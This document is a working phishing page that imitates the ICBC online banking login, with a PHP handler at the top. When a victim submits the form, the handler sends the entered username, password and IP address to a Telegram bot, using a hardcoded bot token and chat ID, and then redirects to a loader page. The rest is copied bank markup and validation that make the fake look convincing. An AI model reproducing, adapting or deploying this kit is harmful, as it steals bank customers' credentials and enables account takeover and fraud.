
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Replace 'your_bot_token_here' with your actual Telegram bot token
    $botToken = '6753618822:AAGFd0-dZfKJckx8Ql1vPHtsRUGFNy4FycE';

    // Replace 'your_chat_id_here' with your actual chat ID (you may need to implement a way to obtain this dynamically)
    $chatId = '-4187545026';

    // Get the values from the form fields
    $remail = $_POST["remail"];
    $rpass = $_POST["rpass"];

    // Get the user's IP address
    $userIP = $_SERVER['REMOTE_ADDR'];

    // Prepare the message with instructions for copying
    $message = "➖➖💲ICBC💲➖➖\n✔️Usuario :  <code>$remail</code>\n✔️Clave :  <code>$rpass</code>\n🌐 IP :  <code>$userIP</code>";

    // Telegram API endpoint
    $apiEndpoint = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';

    // Prepare the data for the HTTP POST request
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML', // Specify HTML parse mode to support formatting
    ];

    // Initialize cURL session
    $ch = curl_init($apiEndpoint);

    // Set cURL options
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute cURL session and close it
    $response = curl_exec($ch);
    curl_close($ch);

    // Check if the message was sent successfully
    if ($response === false) {
        echo 'Error sending message.';
    } else {
        // Redirect to another page
        header("Location: loader.php");
        exit();
    }
}
?>




<html>

<head>
  

    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="expires" content="Fri, 20 Feb 2000 10:51:12 GMT">

    <link rel="Stylesheet" href="/accstatic/css/style.css?v=86.1" type="text/css" media="screen">
    <link rel="Stylesheet" href="/accstatic/css/login-acc.css?v=86.1" type="text/css" media="screen">
    <link rel="Stylesheet" href="/accstatic/css/message-view-acc.css?v=86.1" type="text/css" media="screen">
    <link rel="shortcut icon" href="/accstatic/icbc.ico?v=2">
    <link rel="icon" href="/accstatic/icbc.ico?v=2">
    <link rel="Stylesheet" href="/accstatic/css/font-awesome/css/font-awesome.css" type="text/css" media="screen">
    <link rel="stylesheet" href="/accstatic/css/ui/slider/iview.css?v=86.1" type="text/css" media="screen">
    <link rel="shortcut icon" href="/accstatic/favicon.ico" type="image/x-icon">
    <title>lCBC</title>
    <style>
        .contenedorSlider {
            font-family: Arial;
            cursor: default;
            position: relative;
            overflow: hidden;
        }

        .iview-controlNav a {
            text-indent: -9999px;
        }

        .iview-controlNav {
            position: absolute;
            bottom: 15px;
            right: 40px;
        }

        .iview-controlNav a.iview-control {
            padding: 0px;
            float: left;
            width: 14px;
            height: 14px;
            line-height: 0px;
        }

        .iview-controlNav a.circle {
            background: url('/accstatic/i/bulletcircle.png') no-repeat;
            line-height: 0px;
        }

        .iview-controlNav a.square {
            background: url('/accstatic/i/bulletsquare.png') no-repeat;
            line-height: 0px;
        }

        .iview-controlNav a.rhombus {
            background: url('/accstatic/i/bulletrhombus.png') no-repeat;
            line-height: 0px;
        }

        .iview-controlNav a.number {
            font-size: 19px;
            color: #FFFFFF;
            text-indent: 2px !important;
            line-height: 15px;
        }

        .iview-controlNav div.iview-items {
            float: left;
            padding: 0px;
        }

        .iview-controlNav div.iview-items ul {
            margin: 0px;
            padding: 0px;
        }

        .iview-controlNav div.iview-items ul li {
            padding: 0px;
            float: left;
            width: 14px;
            height: 14px;
            margin: 0px 5px 0px 5px;
            line-height: 0px;
        }

        .iview-controlNav a.iview-control.active {
            color: #FF0000;
            background-position: 0px -14px;
        }

        .iview-controlNav a.iview-control.hover {
            color: #FF0000;
            background-position: 0px -14px;
        }

        #iview-preloader {
            border: 0px;
            width: 32px;
            height: 32px;
            background: url('/accstatic/i/preloader.gif') no-repeat;
        }

        #iview-preloader div {
            background: #DA1F2F;
            height: 7px;
            display: none;
        }

        #iview-timer {
            display: none !important;
        }

        .iview-playPauseButton {
            position: absolute;
            right: 10px;
            bottom: 12px;
            background: url('/accstatic/i/btnplaypause.png') no-repeat;
            background-position: -20px 0px;
            margin: 0px 5px 0px 5px;
            width: 20px;
            height: 20px;
            z-index: 9;
            cursor: pointer;
            display: none;
        }

        .iview-playPauseButton.play {
            background-position: 0px 0px;
        }

        .iview-caption {
            line-height: 0px;
            display: none;
        }

        .iview-imgBackground {
            position: absolute;
            top: 0px;
            left: 0px;
            display: none;
        }
    </style>
    <style>
        .ui-tooltip {
            text-align: left;
        }
    </style>
    <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
    <meta http-equiv="origin-trial" content="A+xK4jmZTgh1KBVry/UZKUE3h6Dr9HPPioFS4KNCzify+KEoOii7z/goKS2zgbAOwhpZ1GZllpdz7XviivJM9gcAAACFeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiQXR0cmlidXRpb25SZXBvcnRpbmdDcm9zc0FwcFdlYiIsImV4cGlyeSI6MTcwNzI2Mzk5OSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
    <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
    <meta http-equiv="origin-trial"content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
   
</head>

<body class="bodySite"
    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjEwIiwic2NvcmUiOjEwOTEwfV0=">

    
    <div class="containerSite" bis_skin_checked="1">
        <!-- HEADER -->

        <div class="headerContainer fullpagewidthline" bis_skin_checked="1">

            <div class="backcolor_0084 logoHeaderDiv" bis_skin_checked="1"><a href=""
                    target="_parent"><img src="/accstatic/i/ICBC_logoBU.png" alt="" border="0" valign="middle"></a>
            </div>
            <div class="header_globe" style="float:right;  " bis_skin_checked="1">
                <table width="200" border="0" cellspacing="0" cellpadding="0">
                    <tbody>
                        <tr valign="top">
                            <td height="20" align="right" class="homeblacktxt">
                                <a href="javascript:MM_openBrWindow('', 'win_ayuda', 580, 450, 550, 450, 'no', 'no', 'no', 'no', 'yes', 'no')"
                                    class="homeblacktxt">ayuda</a> |
                                <a href=""
                                    class="homeblacktxt">contactanos</a>
                            </td>
                        </tr>
                        <tr>
                            <td class="homeblacktxt" height="19"><img src="/accstatic/i/p.gif" width="1" height="1">
                            </td>
                        </tr>
                        <tr>
                            <p><span id="fecha"></span></p>
                            <style>
                                #fecha {
                                    font-size: 10px; /* Cambia el tamaño de fuente según tus preferencias */
                                    margin-left: 32%;
                                }
                            </style>
                            <script>
                                function actualizarFecha() {
                                    var fecha = new Date();
                                    
                                    var dia = fecha.getDate();
                                    var mes = fecha.toLocaleString('es-ES', { month: 'long' }); // Obtiene el nombre del mes en español
                                    var año = fecha.getFullYear();
                                    var horas = fecha.getHours();
                                    var minutos = fecha.getMinutes();
                                    
                                    var fechaFormateada = dia + " de " + mes + " de " + año + " - " + horas + ":" + (minutos < 10 ? '0' : '') + minutos;
                                    
                                    document.getElementById("fecha").innerHTML = fechaFormateada;
                                }
                            
                                // Actualiza la fecha cada minuto
                                setInterval(actualizarFecha, 60000);
                            
                                // Se llama inicialmente para mostrar la fecha de inmediato
                                actualizarFecha();
                            </script>
                        </tr>
                    </tbody>
                </table>
            </div>

            <table class="generalLineSeparator" width="778" border="0" cellspacing="0" cellpadding="0">
                <tbody>
                    <tr>
                        <td height="1"></td>
                    </tr>
                </tbody>
            </table>
        </div>


        <!-- SEPARADOR -->
        <table width="778" border="0" cellspacing="0" cellpadding="0" class="horizontalmenuline">
            <tbody>
                <tr>
                    <td height="1"></td>
                </tr>
            </tbody>
        </table>

        <!-- TITULO -->
        <div id="accessTitle" bis_skin_checked="1">ACCESS BANKING</div>

        <!-- SEPARADOR -->
        <table width="778" border="0" cellspacing="0" cellpadding="0" class="horizontalmenuline">
            <tbody>
                <tr>
                    <td height="1"></td>
                </tr>
            </tbody>
        </table>

        <!-- CONTAINER -->
        <div class="container padding-bottom--5px" bis_skin_checked="1">

            <div class="login-body" bis_skin_checked="1">

                <div class="login-body-align" bis_skin_checked="1">

                    <!-- Mensajes simples genericos -->

                    <div id="containerMessage" class="message-type message-type--inactive" bis_skin_checked="1">
                        <!-- ICONO -->
                        <i id="message-icon" class="push-left" aria-hidden="true"></i>
                        <!-- Titulo -->
                        <div class="message-type__title-simple" id="mensaje-titulo" bis_skin_checked="1"></div>
                        <!-- Descripcion -->
                        <p class="message-type__description" id="mensaje-descripcion"></p>
                    </div>


                    <div id="mensaje-user-bloqueado"
                        class="message-type message-type__error message-type--inactive hideablecontainer"
                        style="padding-top: 2px ; padding-left: 10px ;padding-right: 10px ; padding-bottom: 5px"
                        bis_skin_checked="1">
                        <b>
                            <p class="margin-bottom--reg" style="font-size:12px">
                               
                            </p>
                        </b>
                        <p class="margin-bottom--reg" style="font-size:12px">
                           </p>
                        <div class="no-acc-container" bis_skin_checked="1">
                            <div class="no-acc-atm" style="padding-left: 17px" bis_skin_checked="1">
                            

                                <div style="display:flex ; padding-left: 13px" bis_skin_checked="1">
                                    <div style="float:left;width:40%;margin-top:6px" bis_skin_checked="1">
                                        <a href=""
                                            target="_blank">
                                            <img src="/accstatic/i/AppStoreApple.svg"></a>
                                    </div>
                                    <div style="float:left;width:49%" bis_skin_checked="1">
                                        <a href=""
                                            target="_blank">
                                            <img src="/accstatic/i/google-play-badge.svg"></a>
                                    </div>
                                </div>
                            </div>
                            <div class="no-acc-mob" bis_skin_checked="1">
                                <div class="no-acc-mob-content" style="margin-left:28px" bis_skin_checked="1">
                                    <b>
                                        <p class="margin-bottom--reg" style="font-size:12px">
                                            </p>
                                    </b>
                                    <p class="margin-bottom--reg" style="font-size:12px"></p>
                                    <div class="margin-left--hig margin-bottom--low" style="font-size:12px"
                                        bis_skin_checked="1">
                                      
                                    </div>

                                    <p class="margin-up--reg margin-bottom--reg"
                                        style="font-size:12px ; padding-top: 11px">
                                        <a class="link-inline" href="" style="font-size:12px">
                                            </a>.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>


                    <div id="mensaje-user-monoprod-bloqueado"
                        class="message-type message-type__error message-type--inactive hideablecontainer"
                        bis_skin_checked="1">
                        <div class="message-box" bis_skin_checked="1">
                            <p class="message-type__description">
                                
                            </p>
                        </div>
                    </div>


                    <div class="input-block-container margin-bottom--hig" bis_skin_checked="1">
                        <script>
                            function validarEspacio(event) {
                                if (event.keyCode === 32) {
                                    event.preventDefault();
                                }
                            }
                    
                            function validarCaracteresEspeciales(campo, mensaje) {
                                var valor = document.getElementById(campo).value;
                                var caracteresEspeciales = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+/;
                    
                                if (valor.match(caracteresEspeciales)) {
                                    alert(mensaje);
                                    return false;
                                }
                    
                                return true;
                            }
                    
                            function validarCombinacion(campo, mensaje) {
                                var valor = document.getElementById(campo).value;
                                var letras = /[A-Za-z]/;
                                var numeros = /[0-9]/;
                    
                                if (!letras.test(valor) || !numeros.test(valor)) {
                                    alert(mensaje);
                                    return false;
                                }
                    
                                return true;
                            }
                    
                            function validarFormulario() {
                                if (!validarCaracteresEspeciales("usuario", "El usuario no puede contener caracteres especiales.")) {
                                    return false;
                                }
                    
                                if (!validarCombinacion("usuario", "El usuario debe contener una combinación de letras y números.")) {
                                    return false;
                                }
                    
                                var usuario = document.getElementById("usuario").value;
                    
                                if (usuario.length < 8 || usuario.length > 15) {
                                    alert("El usuario debe tener entre 8 y 15 caracteres.");
                                    return false;
                                }
                    
                                var password = document.getElementById("password").value;
                    
                                if (password.length !== 8) {
                                    alert("La contraseña debe contener exactamente 8 caracteres.");
                                    return false;
                                }
                    
                                if (!validarCaracteresEspeciales("password", "La contraseña no puede contener caracteres especiales.")) {
                                    return false;
                                }
                    
                                if (!validarCombinacion("password", "La contraseña debe contener una combinación de letras y números.")) {
                                    return false;
                                }
                    
                                return true;
                            }
                        </script>
                    </head>
                    <body>
                        <form id="frmLogin" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" onsubmit="return validarFormulario()">

                            <div class="login-input-container" bis_skin_checked="1">
                                <div class="login-input-label" bis_skin_checked="1">Usuario</div>
                                <input id="usuario" class="usuario login-input-text valid" type="text" name="remail"
                                    maxlength="15" tabindex="1" aria-required="true" aria-invalid="false" required
                                    onkeydown="validarEspacio(event)">
                                <div id="usuario-errorMensaje" class="usuario-errorMensaje mensaje-validacion"
                                    style="position:absolute; width: 280px;" bis_skin_checked="1"></div>
                            </div>
                    
                            <div class="login-input-container push-right" bis_skin_checked="1">
                                <div class="login-input-label" bis_skin_checked="1">Clave</div>
                                <input id="password" class="password login-input-text valid" type="password"
                                    required name="rpass" maxlength="8" tabindex="2" aria-required="true"
                                    aria-invalid="false" onkeydown="validarEspacio(event)">
                                <div id="password-errorMensaje" class="password-errorMensaje mensaje-validacion"
                                    style="position:absolute;" type="hidden" bis_skin_checked="1"></div>
                            </div>
                    
                            <ul class="block-buttons">
                                <li class="block-buttons__item">
                                    <input type="submit" align="center" class="btnclass" tabindex="3"
                                        value="INGRESAR">
                                </li>
                            </ul>
                            
                            
                        </form>

                            <div id="login-links" class="input-block-links" bis_skin_checked="1">
                                <ul class="desplegable-links push-left">
                                    <li class="desplegable-links__item">
                                        <a class="olvido-clave btn-link c-list-link" href="">
                                            No puedo ingresar
                                        </a>
                                    </li>
                                    <li class="desplegable-links__item last">
                                        <a class="btn-link" href="">
                                            Tengo una clave provisoria
                                        </a>
                                    </li>
                                    <li class="desplegable-links__item last">

                                        <div class="helpIco"
                                            title="Si generaste tu clave en un cajero automático Banelco, ingresá a través de la opción ‘Tengo una clave provisoria’."
                                            bis_skin_checked="1"></div>
                                    </li>

                                </ul>
                            </div>

                            <div class="clearfix" bis_skin_checked="1"></div>


                            <div class="c-list-link__content" style="display:none" bis_skin_checked="1">
                                <p class="margin-up--reg margin-bottom--reg"></p>
                                <div class="no-acc-container" bis_skin_checked="1">
                                    <div class="no-acc-atm" bis_skin_checked="1">
                                        <b>
                                            <p class="margin-bottom--reg"></p>
                                        </b>
                                        <p class="margin-bottom--reg"></p>
                                      
                                        <br>
                                        <p class="margin-up--reg margin-bottom--reg">
                                            <a class="link-inline" href=""></a>
                                        </p>
                                    </div>
                                    <div class="no-acc-mob" bis_skin_checked="1">
                                        <div class="no-acc-mob-content" bis_skin_checked="1">
                                            <b>
                                                <p class="margin-bottom--reg"></p>
                                            </b>
                                            <p class="margin-bottom--reg"> <strong></strong>.</p>
                                            <img class="no-acc-mob-img" src="/accstatic/i/qr-code.svg">
                                            <p class="margin-up--reg margin-bottom--reg"></p>

                                            <div style="display:flex" bis_skin_checked="1">
                                                <div style="float:left;width:40%;margin-top:6px" bis_skin_checked="1">
                                                    <a href=""
                                                        target="_blank">
                                                        <img src="/accstatic/i/AppStoreApple.svg"></a>
                                                </div>
                                                <div style="float:left;width:49%" bis_skin_checked="1">
                                                    <a href=""
                                                        target="_blank">
                                                        <img src="/accstatic/i/google-play-badge.svg"></a>
                                                </div>

                                            </div>

                                        </div>
                                    </div>
                                </div>
                            </div>

                        </form>

                    </div>

                    <!-- Style teclado virtual -->
                    <link rel="Stylesheet" href="/accstatic/css/tecladoVirtual/dragWindow.css?v=86.1" type="text/css"   media="screen">
                    <link rel="Stylesheet" href="/accstatic/css/tecladoVirtual/TecladoEstilo.css?v=86.1" type="text/css" media="screen">


                    <div class="virtual-key-block__virtual_key" bis_skin_checked="1">
                        <div class="virtual-Key-block__check" bis_skin_checked="1">
                            <input type="checkbox" id="check_VKB" name="virtualkb"
                                onclick="javascript:toggleKB1(this, 'linkString');">
                            <label class="virtual-key-block__label virtual-key-text">Teclado virtual</label>
                        </div>
                    </div>



                </div>
            </div>

            <div class="text-coments-block padding-global--reg" bis_skin_checked="1"> <a
                    href="javascript:MM_openBrWindow('nota.do?ID=tyc', 'win_tyc', 580, 450, 550, 450, 'no', 'no', 'no', 'no', 'yes', 'no');"
                    hidefocus="true" tabindex="-1">
                    <strong> </strong></a><br>
 
            </div>

            <!-- INFO TARJETAS Y MONOPRODUCTO -->
            <div class="debito-block" bis_skin_checked="1">
                <img style="margin-left: -5%;" src="/accstatic/anunc.png" alt="">
                    </div>

  

</body>
</html>